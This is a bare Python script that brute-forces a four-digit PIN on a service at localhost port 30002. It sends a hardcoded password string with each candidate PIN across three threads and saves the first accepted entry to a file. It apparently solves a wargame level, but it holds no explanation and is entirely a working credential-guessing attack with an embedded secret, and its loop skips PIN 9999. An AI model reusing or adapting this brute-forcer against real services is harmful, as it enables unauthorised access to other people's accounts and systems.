#!/bin/python3

import socket
import random
import threading

wordlist = []
for i in range(0,9999):
        wordlist.append("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" + " " + str(i).rjust(4,"0") + "\n")

random.shuffle(wordlist)

handler = open("password.txt","+r")

def brute_connection(handler, wordlist):
        misock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        misock.connect(("localhost", 30002))
        misock.recv(1024)

        for i in wordlist:
                print("[*] Trying: ", i.rstrip("\n"), end="\r")
                misock.send(i.encode())
                info = misock.recv(1024)
                if "Wrong" not in info.decode():
                        print("[*] FOUND: ",i)
                        handler.write(i)
                        exit()
        else:
                print("FINISH")

counter_min=0
counter_max=3332
for i in range(3):
        if counter_max > len(wordlist):
                threading.Thread(target=brute_connection, args=(handler, wordlist[counter_min:])).start()
                break
        else:
                threading.Thread(target=brute_connection, args=(handler, wordlist[counter_min:counter_max])).start()
                counter_min = counter_max
                counter_max += 3332
